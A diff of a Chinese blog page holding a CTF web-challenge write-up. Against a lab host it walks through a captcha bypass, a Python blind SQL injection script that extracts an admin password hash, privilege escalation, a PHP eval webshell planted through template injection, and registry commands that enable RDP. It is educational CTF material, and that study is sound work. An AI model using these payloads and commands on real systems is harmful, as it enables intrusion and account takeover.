class="line">           b += f ? <span class="string">";\tsecure"</span>: <span class="string">""</span>;</span><br><span class="line">           document.cookie = b</span><br><span class="line">       &#125;;</span><br></pre></td></tr></table></figure></p>
+<p>发现函数应该是传入5个参数，有问题。<br>一个坑，其实三个参数只是提示，并不是可以执行的。<br>urlkey —&gt; url地址访问e100.js    864ES忽略<br><img src="http://ww3.sinaimg.cn/large/006iKNp3gy1fkkabybwmlj30ej04jmx3.jpg" alt="jsfuck"><br>jsfuck编码，<a href="http://www.bugku.com/tools/jsfuck/#" target="_blank" rel="noopener">这里</a><br>得到flag</p>
+<h2 id="全球某工商CTF-安全系的博客"><a href="#全球某工商CTF-安全系的博客" class="headerlink" title="全球某工商CTF-安全系的博客"></a>全球某工商CTF-安全系的博客</h2><p><a href="http://10.21.13.225/zn" target="_blank" rel="noopener">戳这里=w=</a></p>
 <h3 id="后台-伪验证-sql注入-登录-模板注入攻击-菜刀"><a href="#后台-伪验证-sql注入-登录-模板注入攻击-菜刀" class="headerlink" title="后台 伪验证 sql注入 登录 模板注入攻击 菜刀"></a>后台 伪验证 sql注入 登录 模板注入攻击 菜刀</h3><p>很厉害的一个网页，随便点点没什么发现。<br>右键源码一个个看，没什么发现。<br>上工具<strong>SourceLeakHacker</strong>跑目录</p>
 <div align="center"><br><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fkkbpkw17oj30gq0ag0ts.jpg" alt="跑目录"><br></div><br>先尝试访问<strong>200</strong>（正确返回），没有可用信息<br>再尝试访问<strong>303</strong>（跳转），找到<strong>/admin</strong>跳转至后台登录界面<strong>/admin-sign</strong><br>随意试着登录，有逐层递进四种返回状态：<br>+ <strong>参数不能为空！</strong>：判断参数是否为空<br>+ <strong>验证码不正确！</strong>：判断验证码<br>+ <strong>用户名不存在！</strong>：判断用户名是否存在<br>+ <strong>用户认证失败！</strong>：判断密码是否正确<br>先要解决验证码问题，抓包发现，发送账号密码验证码等信息后会再发一个请求包，来修改验证码图片<br><div align="center"><br><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fkkc8whxcrj30dn06ymxl.jpg" alt="验证码包"><br></div>
 
-<p>丢弃这个包，验证码不再发生变化，等于绕过了验证<br>尝试<strong>sql注入</strong><br>在用户名处发现注入点<br><code>admin&#39; and &#39;1&#39;=&#39;1</code> 返回 用户认证失败<br><code>admin&#39; and &#39;1&#39;=&#39;2</code> 返回 用户名不存在<br>ps.关于解码/u 在返回包中有写着charset=UTF-8，在python中<code>urllib.unquote(b)</code>即可<br>boolean型盲注password，给出脚本代码：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"><span class="comment">#coding:utf-8</span></div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> urllib</div><div class="line"></div><div class="line">url=<span class="string">"http://10.21.13.225/admin-sign/login"</span></div><div class="line"></div><div class="line">payloads=<span class="string">"1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPLKJHGFDSAZXCVBNM,./;'[]\_@!#$%^&amp;*()-=+~`[];'./"</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">#判断列</span></div><div class="line">sql_column=<span class="string">"admin' and column is not null--+"</span>  <span class="comment">#替换column  得到 password</span></div><div class="line"><span class="comment">#列出password</span></div><div class="line">sql=<span class="string">"admin'  and  ascii(substring(password,%s,1))=%s-- "</span></div><div class="line"></div><div class="line">cookies = dict(ci_session=<span class="string">'b9de57e065184832d04df4c4aa18242f13e04d89'</span>)</div><div class="line"><span class="comment">#headers = &#123;"Content-Type": "application/x-www-form-urlencoded"&#125;</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">(i,x)</span>:</span></div><div class="line">	data=&#123;<span class="string">'username'</span>:sql %(i,x),<span class="string">'password'</span>:<span class="string">'21232f297a57a5a743894a0e4a801fc3'</span>,<span class="string">'verify'</span>:<span class="string">'学商商浙浙商'</span>&#125;</div><div class="line">	response=requests.post(url,cookies=cookies,data=data)</div><div class="line">	<span class="comment">#print response.content</span></div><div class="line">	<span class="keyword">if</span>  response.text.find(<span class="string">'\u8ba4'</span>) != <span class="number">-1</span>:</div><div class="line">		<span class="keyword">return</span> <span class="number">1</span></div><div class="line">	<span class="keyword">else</span> :</div><div class="line">		<span class="keyword">return</span> <span class="number">0</span></div><div class="line"></div><div class="line"></div><div class="line">key=<span class="string">''</span></div><div class="line">print(<span class="string">'start'</span>)</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">59</span>):</div><div class="line">	<span class="keyword">print</span> i</div><div class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> xrange(<span class="number">30</span>,<span class="number">151</span>):</div><div class="line">		<span class="keyword">if</span> exp(i,x)==<span class="number">1</span> :</div><div class="line">			key += chr(x)</div><div class="line">			print(key)</div><div class="line">			<span class="keyword">break</span></div></pre></td></tr></table></figure></p>
-<p>得到admin的密码MD5为1c63129ae9db9c60c3e8aa94d3e00495<br>直接登录到后台。<br>发现修改语言里面的东西没有权限。<br>发现有管理员账号<strong>orleven</strong>，<strong>平行越权</strong>修改管理员密码。<br> <strong>平行越权</strong>：设置-修改密码，抓包修改admin为orleven。<br>登录进入中文的编辑语言界面。（如果选英文的需要设置为启动，不然之后菜刀连接不上界面）<br>尝试<strong>模板注入漏洞</strong>，后尾加入<code>&quot;;phpinfo();&quot;</code>闭合前后引号<br><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fkke2fr6sjj30v30jhjtq.jpg" alt=""><br>页面变化，说明修改了代码可以执行<br>再加入菜刀php木马<code>&quot;;@eval($_POST[&#39;Cknife&#39;]);&quot;</code><br>连上菜刀</p>
-<p><div align="center"><br><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fkkecje92vj30ci06oq2v.jpg" alt=""><br></div><br>可以直接在桌面上找到flag<br>或者继续：</p>
-<p>切换到菜刀终端模式，开启远程连接3389端口<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">删除注册表</div><div class="line">reg delete <span class="string">"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server"</span> /v fDenyTSConnections /f</div><div class="line">添加注册表</div><div class="line">reg add <span class="string">"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server"</span> /v fDenyTSConnections /t REG_DWORD /d 0 /f</div></pre></td></tr></table></figure></p>
+<p>丢弃这个包，验证码不再发生变化，等于绕过了验证<br>尝试<strong>sql注入</strong><br>在用户名处发现注入点<br><code>admin&#39; and &#39;1&#39;=&#39;1</code> 返回 用户认证失败<br><code>admin&#39; and &#39;1&#39;=&#39;2</code> 返回 用户名不存在<br>ps.关于解码/u 在返回包中有写着charset=UTF-8，在python中<code>urllib.unquote(b)</code>即可<br>boolean型盲注password，给出脚本代码：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">url=<span class="string">"http://10.21.13.225/admin-sign/login"</span></span><br><span class="line"></span><br><span class="line">payloads=<span class="string">"1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPLKJHGFDSAZXCVBNM,./;'[]\_@!#$%^&amp;*()-=+~`[];'./"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#判断列</span></span><br><span class="line">sql_column=<span class="string">"admin' and column is not null--+"</span>  <span class="comment">#替换column  得到 password</span></span><br><span class="line"><span class="comment">#列出password</span></span><br><span class="line">sql=<span class="string">"admin'  and  ascii(substring(password,%s,1))=%s-- "</span></span><br><span class="line"></span><br><span class="line">cookies = dict(ci_session=<span class="string">'b9de57e065184832d04df4c4aa18242f13e04d89'</span>)</span><br><span class="line"><span class="comment">#headers = &#123;"Content-Type": "application/x-www-form-urlencoded"&#125;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">(i,x)</span>:</span></span><br><span class="line">	data=&#123;<span class="string">'username'</span>:sql %(i,x),<span class="string">'password'</span>:<span class="string">'21232f297a57a5a743894a0e4a801fc3'</span>,<span class="string">'verify'</span>:<span class="string">'学商商浙浙商'</span>&#125;</span><br><span class="line">	response=requests.post(url,cookies=cookies,data=data)</span><br><span class="line">	<span class="comment">#print response.content</span></span><br><span class="line">	<span class="keyword">if</span>  response.text.find(<span class="string">'\u8ba4'</span>) != <span class="number">-1</span>:</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">	<span class="keyword">else</span> :</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key=<span class="string">''</span></span><br><span class="line">print(<span class="string">'start'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">59</span>):</span><br><span class="line">	<span class="keyword">print</span> i</span><br><span class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> xrange(<span class="number">30</span>,<span class="number">151</span>):</span><br><span class="line">		<span class="keyword">if</span> exp(i,x)==<span class="number">1</span> :</span><br><span class="line">			key += chr(x)</span><br><span class="line">			print(key)</span><br><span class="line">			<span class="keyword">break</span></span><br></pre></td></tr></table></figure></p>
+<p>得到admin的密码MD5为1c63129ae9db9c60c3e8aa94d3e00495<br>直接登录到后台。<br>发现修改语言里面的东西没有权限。<br>发现有管理员账号<strong>orleven</strong>，<strong>平行越权</strong>修改管理员密码。<br> <strong>平行越权</strong>：设置-修改密码，抓包修改admin为orleven。<br>登录进入中文的编辑语言界面。（如果选英文的需要设置为启动，不然之后菜刀连接不上界面）<br>尝试<strong>模板注入漏洞</strong>，后尾加入<code>&quot;;phpinfo();&quot;</code>闭合前后引号<br><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fkke2fr6sjj30v30jhjtq.jpg" alt><br>页面变化，说明修改了代码可以执行<br>再加入菜刀php木马<code>&quot;;@eval($_POST[&#39;Cknife&#39;]);&quot;</code><br>连上菜刀</p>
+<p><div align="center"><br><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fkkecje92vj30ci06oq2v.jpg" alt><br></div><br>可以直接在桌面上找到flag<br>或者继续：</p>
+<p>切换到菜刀终端模式，开启远程连接3389端口<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">删除注册表</span><br><span class="line">reg delete <span class="string">"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server"</span> /v fDenyTSConnections /f</span><br><span class="line">添加注册表</span><br><span class="line">reg add <span class="string">"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server"</span> /v fDenyTSConnections /t REG_DWORD /d 0 /f</span><br></pre></td></tr></table></figure></p>
 <p>修改密码<code>net user Administrator (复杂的密码)</code><br>打开远程桌面连接，账号administrator 密码<br>桌面上得到flag</p>
 
-      
-    </div>
-    
   </div>
-  
-    
-    <div class="copyright">
-        <p><span>本文标题:</span><a href="/2017/09/18/ZJGSCTF_writeup/">ZJGSCTF-writeup</a></p>
-        <p><span>文章作者:</span><a href="/" title="回到主页">LaLa</a></p>
-        <p><span>发布时间:</span>2017-09-18, 08:17:13</p>
-        <p><span>最后更新:</span>2018-04-25, 12:25:49</p>
-        <p>
-            <span>原始链接:</span><a class="post-url" href="/2017/09/18/ZJGSCTF_writeup/" title="ZJGSCTF-writeup">http://lalajun.com/2017/09/18/ZJGSCTF_writeup/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://lalajun.com/2017/09/18/ZJGSCTF_writeup/　　作者: LaLa" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
-            <script> var clipboard = new Clipboard('.copy-path'); </script>
-        </p>
-        <p>
-            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
-        </p>
-    </div>
-
-
-
-    <nav id="article-nav">
-        
-            <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2017/09/24/WEB-CTF中的sql盲注/">
-                    WEB-CTF中的sql盲注
-                </a>
-            </div>
-        
-        
-            <div id="article-nav-older" class="article-nav-title">
-                <a href="/2017/08/29/WEB-CTF中的SQL注入/">
-                    WEB-CTF中的SQL注入
-                </a>
-            </div>
-        
-    </nav>
-
-  
 </article>
 
-    <div id="toc" class="toc-article">
-        <strong class="toc-title">文章目录</strong>
-        
-            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#9-7-综合题"><span class="toc-text">[9-7]综合题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#涉及范围：编码及Linux"><span class="toc-text">涉及范围：编码及Linux</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8-31-水能载舟亦可赛艇"><span class="toc-text">[8-31]水能载舟亦可赛艇</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#涉及范围-php源码，sql注入"><span class="toc-text">涉及范围:php源码，sql注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9-18-有点意思吧"><span class="toc-text">[9.18]有点意思吧</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#涉及范围：php源码，hash长度扩展攻击"><span class="toc-text">涉及范围：php源码，hash长度扩展攻击</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#有点意思吧2"><span class="toc-text">有点意思吧2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#涉及范围：目录遍历-file命令-swp，php源码-hash长度攻击-脚本"><span class="toc-text">涉及范围：目录遍历,file命令,.swp，php源码,hash长度攻击,脚本</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9-1-看起来有点难啊"><span class="toc-text">[9.1]看起来有点难啊</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#涉及范围：sql盲注"><span class="toc-text">涉及范围：sql盲注</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#皇家邮电平台"><span class="toc-text">皇家邮电平台</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#涉及范围：源码泄露，本地文件包含，sql注入，后门利用"><span class="toc-text">涉及范围：源码泄露，本地文件包含，sql注入，后门利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#babyphp"><span class="toc-text">babyphp</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#git信息泄露-hackgit-php字符串拼接注入"><span class="toc-text">.git信息泄露 hackgit php字符串拼接注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#俄罗斯方块"><span class="toc-text">俄罗斯方块</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#js代码-jsFuck"><span class="toc-text">js代码 jsFuck</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#全球某工商CTF-安全系的博客"><span class="toc-text">全球某工商CTF-安全系的博客</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#后台-伪验证-sql注入-登录-模板注入攻击-菜刀"><span class="toc-text">后台 伪验证 sql注入 登录 模板注入攻击 菜刀</span></a></li></ol></li></ol>
-        
-    </div>
-    <style>
-        .left-col .switch-btn,
-        .left-col .switch-area {
-            display: none;
-        }
-        .toc-level-3 i,
-        .toc-level-3 ol {
-            display: none !important;
-        }
-    </style>
-
-    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
-
-    <script>
-        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
-    </script>
-
-
-
-
-
-    
-
-
-
-
-    <div class="scroll" id="post-nav-button">
-        
-            <a href="/2017/09/24/WEB-CTF中的sql盲注/" title="上一篇: WEB-CTF中的sql盲注">
-                <i class="fa fa-angle-left"></i>
-            </a>
-        
-
-        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
-
-        
-            <a href="/2017/08/29/WEB-CTF中的SQL注入/" title="下一篇: WEB-CTF中的SQL注入">
-                <i class="fa fa-angle-right"></i>
-            </a>
-        
-    </div>
-
-    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2018/09/26/Tools-nmap/">Tools-nmap使用</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/09/15/0day-NEO智能合约平台Runtime.Notify()调用拒绝服务漏洞/">0day-NEO智能合约平台Runtime.Notify调用拒绝服务漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/08/29/智能合约安全-重入攻击/">智能合约安全-重入攻击</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/08/25/浏览器渲染原理与编码解码/">浏览器渲染原理与编码解码</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/08/15/NEO-搭建私有链/">NEO-搭建私有链</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/08/13/NEO-JAVA环境/">NEO-智能合约JAVA c#环境</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/08/07/DAPP开发中趟过的坑/">DAPP开发中趟过的坑</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/08/07/truffle_contact/">Truffle-Contract中间件</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/08/07/truffle/">Truffle框架</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/11/Vue组件/">Vue-组件</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/11/Vue/">Vue-基础</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/11/mysql-字符集漏洞/">Mysql-字符集漏洞分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/06/ZJGSCTF-2018-writeup/">ZJGSCTF-2018-web writup</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/27/WEB-RPO攻击/">WEB-RPO攻击</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/23/Ubuntu下Apache2、Mysql、php7搭建/">Ubuntu下Apache2、Mysql、php7搭建</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/21/docker/">Docker使用</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/09/WEB-SQL报错注入/">WEB-SQL报错注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/03/web-phpinfo包含临时文件/">WEB-基于phpinfo的包含临时文件</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/26/WEB-网强杯 WEB writeup/">WEB-网强杯-WEB-writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/19/WEB-LFI与RFI利用/">WEB-LFI与RFI利用</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/06/WEB-PHP核心配置/">WEB-PHP核心配置</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/26/WEB-Cookie注入与伪静态注入/">WEB-Cookie注入与伪静态注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/30/WEB-HTTP基础/">WEB-HTTP基础</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/01/25/python笔记/">python2.7笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/27/比特币&区块链与交易/">比特币&区块链与交易</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/27/比特币&区块链与挖矿/">比特币&区块链与挖矿</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/05/WEB-CTF中的SQL文件操作/">WEB-CTF中的SQL文件操作</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/19/WEB-CTF中的绕过/">WEB-CTF中的绕过</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/24/WEB-CTF中的sql盲注/">WEB-CTF中的sql盲注</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/18/ZJGSCTF_writeup/">ZJGSCTF-writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/29/WEB-CTF中的SQL注入/">WEB-CTF中的SQL注入</a></li></ul>
-
-
-
-
-    <script>
-        
-    </script>
-</div>
-      <footer id="footer">
-    <div class="outer">
-        <div id="footer-info">
-            <div class="footer-left">
-                <i class="fa fa-copyright"></i> 
-                2017-2018 LaLa
-            </div>
-            <div class="footer-right">
-                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
-            </div>
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>加载评论需要在浏览器启用 JavaScript 脚本支持。</noscript>
         </div>
-        
-            <div class="visit">
-                
-                    <span id="busuanzi_container_site_pv" style='display:none'>
-                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
-                        </span>
-                    </span>
-                
-                
-                    <span>| </span>
-                
-                
-                    <span id="busuanzi_container_page_pv" style='display:none'>
-                        <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
-                        </span>
-                    </span>
-                
-            </div>
-        
     </div>
-</footer>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/friends/">友链</a></li>
+        
+      </ul>
     </div>
-    
-<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
 
-    <script>
-        $(document).ready(function() {
-            var iPad = window.navigator.userAgent.indexOf('iPad');
-            if (iPad > -1 || $(".left-col").css("display") === "none") {
-                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
-                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
-                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
-            }
-            else {
-                var backgroundnum = 5;
-                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
-                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
-            }
-        })
-    </script>
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#9-7-综合题"><span class="toc-number">1.</span> <span class="toc-text">[9-7]综合题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#涉及范围：编码及Linux"><span class="toc-number">1.1.</span> <span class="toc-text">涉及范围：编码及Linux</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8-31-水能载舟亦可赛艇"><span class="toc-number">2.</span> <span class="toc-text">[8-31]水能载舟亦可赛艇</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#涉及范围-php源码，sql注入"><span class="toc-number">2.1.</span> <span class="toc-text">涉及范围:php源码，sql注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9-18-有点意思吧"><span class="toc-number">3.</span> <span class="toc-text">[9.18]有点意思吧</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#涉及范围：php源码，hash长度扩展攻击"><span class="toc-number">3.1.</span> <span class="toc-text">涉及范围：php源码，hash长度扩展攻击</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#有点意思吧2"><span class="toc-number">4.</span> <span class="toc-text">有点意思吧2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#涉及范围：目录遍历-file命令-swp，php源码-hash长度攻击-脚本"><span class="toc-number">4.1.</span> <span class="toc-text">涉及范围：目录遍历,file命令,.swp，php源码,hash长度攻击,脚本</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9-1-看起来有点难啊"><span class="toc-number">5.</span> <span class="toc-text">[9.1]看起来有点难啊</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#涉及范围：sql盲注"><span class="toc-number">5.1.</span> <span class="toc-text">涉及范围：sql盲注</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#皇家邮电平台"><span class="toc-number">6.</span> <span class="toc-text">皇家邮电平台</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#涉及范围：源码泄露，本地文件包含，sql注入，后门利用"><span class="toc-number">6.1.</span> <span class="toc-text">涉及范围：源码泄露，本地文件包含，sql注入，后门利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#babyphp"><span class="toc-number">7.</span> <span class="toc-text">babyphp</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#git信息泄露-hackgit-php字符串拼接注入"><span class="toc-number">7.1.</span> <span class="toc-text">.git信息泄露 hackgit php字符串拼接注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#俄罗斯方块"><span class="toc-number">8.</span> <span class="toc-text">俄罗斯方块</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#js代码-jsFuck"><span class="toc-number">8.1.</span> <span class="toc-text">js代码 jsFuck</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#全球某工商CTF-安全系的博客"><span class="toc-number">9.</span> <span class="toc-text">全球某工商CTF-安全系的博客</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#后台-伪验证-sql注入-登录-模板注入攻击-菜刀"><span class="toc-number">9.1.</span> <span class="toc-text">后台 伪验证 sql注入 登录 模板注入攻击 菜刀</span></a></li></ol></li></ol>
+    </div>
 
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://lalajun.com/2017/09/18/ZJGSCTF_writeup/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://lalajun.com/2017/09/18/ZJGSCTF_writeup/&text=ZJGSCTF-writeup"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://lalajun.com/2017/09/18/ZJGSCTF_writeup/&title=ZJGSCTF-writeup"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://lalajun.com/2017/09/18/ZJGSCTF_writeup/&is_video=false&description=ZJGSCTF-writeup"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=ZJGSCTF-writeup&body=Check out this article: http://lalajun.com/2017/09/18/ZJGSCTF_writeup/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://lalajun.com/2017/09/18/ZJGSCTF_writeup/&title=ZJGSCTF-writeup"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://lalajun.com/2017/09/18/ZJGSCTF_writeup/&title=ZJGSCTF-writeup"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://lalajun.com/2017/09/18/ZJGSCTF_writeup/&title=ZJGSCTF-writeup"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://lalajun.com/2017/09/18/ZJGSCTF_writeup/&title=ZJGSCTF-writeup"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
